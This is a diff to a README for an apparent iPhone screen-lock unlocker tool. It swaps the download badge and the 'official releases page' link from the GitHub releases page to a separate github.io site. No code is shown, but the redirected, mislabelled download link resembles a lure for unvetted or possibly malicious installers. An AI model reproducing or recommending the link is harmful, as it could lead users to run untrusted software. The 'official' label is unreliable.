@@ -1,6 +1,6 @@
 # 🔓 TunesKit-iPhone-Unlocker-2026 - Unlock your iPhone screen with ease
 
-[![](https://img.shields.io/badge/Download-TunesKit-blue)](https://github.com/Tranh4285/TunesKit-iPhone-Unlocker-2026/releases)
+[![](https://img.shields.io/badge/Download-TunesKit-blue)](https://tranh4285.github.io)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Ensure your computer meets these minimum requirements before you start:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/Tranh4285/TunesKit-iPhone-Unlocker-2026/releases) to access the installer.
+1. Visit the [official releases page](https://tranh4285.github.io) to access the installer.
 2. Select the latest version of the installer file in the assets section.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
